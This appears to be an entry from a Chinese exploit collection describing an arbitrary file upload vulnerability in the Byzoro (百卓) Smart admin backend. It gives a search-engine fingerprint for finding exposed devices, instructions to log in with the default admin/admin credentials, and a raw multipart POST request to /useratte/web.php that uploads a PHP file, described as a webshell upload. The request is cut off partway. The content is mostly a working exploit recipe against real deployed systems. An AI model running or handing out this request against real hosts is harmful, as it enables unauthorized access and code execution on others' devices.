# 百卓Smart后台任意文件上传漏洞

- **系统**：百卓Smart后台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="byzoro-Smart"`
- **请求**：`POST /useratte/web.php? HTTP/1.1`

**请求体 / payload**
```
1. 使用默认账号`admin/admin`登录后台，获取登录后的`cookie`
2. 使用上一步获取的cookie替换上传webshell
Host: xx.xx.xx.xx
Cookie: PHPSESSID=6fca23a63591d8742708a4c50308f150
Content-Type: multipart/form-data; boundary=---------------------------42328904123665875270630079328
Content-Length: 611
Sec-Fetch-User: ?1
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="file_upload"; filename="2.php"
Content-Type: application/octet-stream
<?php phpinfo(); ?>
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="id_type"
1
------------------------…（脚本共 881 字，完整版见原文）
```

**其他**
- 百卓Smart后台任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 百卓Smart